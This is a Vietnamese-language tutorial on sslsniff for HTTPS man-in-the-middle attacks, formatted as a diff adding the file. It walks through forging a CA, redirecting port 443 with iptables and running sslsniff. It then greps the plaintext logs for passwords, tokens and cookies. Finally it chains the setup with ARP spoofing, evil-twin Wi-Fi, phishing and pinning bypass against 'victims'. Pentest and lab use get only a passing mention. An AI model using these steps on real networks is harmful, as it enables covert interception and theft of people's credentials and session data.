@@ -1,0 +1,141 @@
+1. sslsniff là gì?
+
+    sslsniff là tool MITM SSL/TLS, cho phép chặn và giải mã, ghi log traffic HTTPS/SSL, cấp phát cert giả động, export plaintext, ghi lại toàn bộ data trao đổi giữa client và server.
+
+    Dùng cấp phát certificate giả (CA tự tạo hoặc được chỉ định), ép client “tin tưởng” attacker, MITM giữa browser/app ↔ internet.
+
+    Thường dùng để:
+
+        Sniff credential đăng nhập qua HTTPS
+
+        Debug app, phát hiện dữ liệu rò rỉ
+
+        Phishing, test SSL pinning, bypass HSTS
+
+        Forensic, audit, training bảo mật mạng
+
+2. Cài đặt sslsniff
+A. Ubuntu/Kali/Debian (có sẵn trong repo/hay script git)
+
+sudo apt update
+sudo apt install sslsniff
+
+    Hoặc build thủ công:
+
+    git clone https://github.com/moxie0/sslsniff.git
+    cd sslsniff
+    make
+
+3. Tạo và cấu hình CA certificate (để browser tin tưởng)
+
+    Tạo CA cert/key
+
+    openssl req -new -x509 -days 3650 -keyout ca.key -out ca.crt -nodes
+
+    Import ca.crt vào browser/device (nếu không, browser sẽ báo lỗi hoặc không MITM được)
+
+4. Thực chiến MITM với sslsniff
+A. Cấu hình iptables để redirect traffic HTTPS về sslsniff
+
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8443
+
+    Chạy lại sau mỗi reboot (hoặc script tự động).
+
+B. Chạy sslsniff để MITM
+
+sudo sslsniff -a -c ca.crt -k ca.key -w log.txt -p 8443
+
+    -a: Auto-generate cert cho mỗi domain
+
+    -c, -k: CA cert/key
+
+    -w: File ghi log plaintext traffic
+
+    -p: Port sslsniff lắng nghe (8443)
+
+C. MITM từng domain cụ thể (nâng cao)
+
+sudo sslsniff -c ca.crt -k ca.key -w log.txt -p 8443 -t "facebook.com,google.com"
+
+    -t: Chỉ MITM các domain trong list (bỏ qua domain khác để stealth hơn)
+
+5. Sniff password, cookie, credential, dữ liệu nhạy cảm
+
+    Toàn bộ request/response HTTPS được export plaintext trong file log.txt
+
+    Search với grep:
+
+    grep -i "password\|session\|token\|cookie" log.txt
+
+    Hoặc dùng Wireshark phân tích file pcap song song nếu cần.
+
+6. Phối hợp attack workflow nâng cao
+A. Kết hợp arpspoof/ettercap/bettercap để MITM trên LAN
+
+    Chạy arpspoof/ettercap/bettercap để chiếm MITM giữa victim <-> gateway
+
+    Redirect port 443 về sslsniff (iptables)
+
+    Chạy sslsniff như trên
+
+    Import CA cert lên máy victim (hoặc attack exploit user chưa kiểm soát)
+
+B. Phục vụ phishing/evil twin
+
+    Dùng sslsniff trên rogue AP/wifi free, MITM HTTPS traffic từ khách kết nối.
+
+C. Bypass SSL Pinning/HSTS (bằng phương pháp ngoài)
+
+    Trên mobile app dùng Frida/Objection để bypass pinning (cho phép accept cert fake).
+
+    Dùng plugin, browser cũ, hoặc môi trường test.
+
+7. Automation/script hóa sslsniff
+
+    Script tự động restart sslsniff khi crash, rotate log:
+
+    #!/bin/bash
+    while true; do
+      sslsniff -a -c ca.crt -k ca.key -w log-$(date +%F-%T).txt -p 8443
+      sleep 1
+    done
+
+    Parse log auto:
+
+        Dùng awk, grep, python để extract credential, filter traffic.
+
+        Kết hợp với SIEM, ELK, Splunk, hoặc custom alert/report.
+
+8. Fix lỗi thực tế
+Lỗi	Cách xử lý
+Browser warning/lỗi cert	Phải import ca.crt vào máy victim (hoặc exploit SSL pinning/bỏ cảnh báo)
+Không MITM được HTTPS	Redirect sai port, chưa có iptables, victim dùng HSTS/DoH/DoT
+Không sniff được credential	App có pinning, form data encrypt, web hiện đại (cần exploit thêm)
+sslsniff crash/không log	Dùng version mới, check permission, chạy sudo/root
+Không thấy traffic	Sai interface, không MITM thành công, app dùng QUIC/HTTP3
+9. So sánh sslsniff với các tool MITM HTTPS khác
+Tool	Ưu điểm sslsniff	Khác biệt
+sslsniff	Nhẹ, tự động cấp cert, CLI, log raw, cực stealth, tốt cho lab, forensic	Không có GUI, không sửa content, không automation mạnh
+mitmproxy	Script Python, sửa traffic, GUI/TUI, export object, filter mạnh	Nặng hơn, không auto cấp cert raw kiểu sslsniff
+Bettercap	MITM mọi giao thức, automation CLI, fake DNS, inject code	Yêu cầu học CLI, multi-protocol, không log raw gọn như sslsniff
+Ettercap	MITM, filter packet, GUI/TUI	Không chuyên HTTPS, khó debug, hay bị bug
+sslstrip	Downgrade HTTPS → HTTP, log plain	Chỉ dùng với HTTP, không MITM HTTPS gốc
+Wireshark	Phân tích, forensic, decode protocol	Không MITM, chỉ phân tích đã ghi lại
+10. Tài liệu, link hữu ích
+
+    sslsniff GitHub
+
+    sslsniff Linux Manpage
+
+    PayloadAllTheThings – MITM SSL
+
+    Hacktricks – HTTPS interception
+
+    Frida SSL Pinning Bypass
+
+Tóm tắt nhanh
+
+    sslsniff: tool MITM HTTPS siêu nhẹ, tự động cấp cert, export log plaintext raw, cực hợp lab, pentest, forensic, demo phishing, research, bypass SSL/HSTS trong môi trường test (phối hợp arpspoof, ettercap, bettercap).
+
+    Nên import CA cert lên victim, dùng iptables redirect, chain với Wireshark/tcpdump để phân tích sâu, script auto log/alert.
+
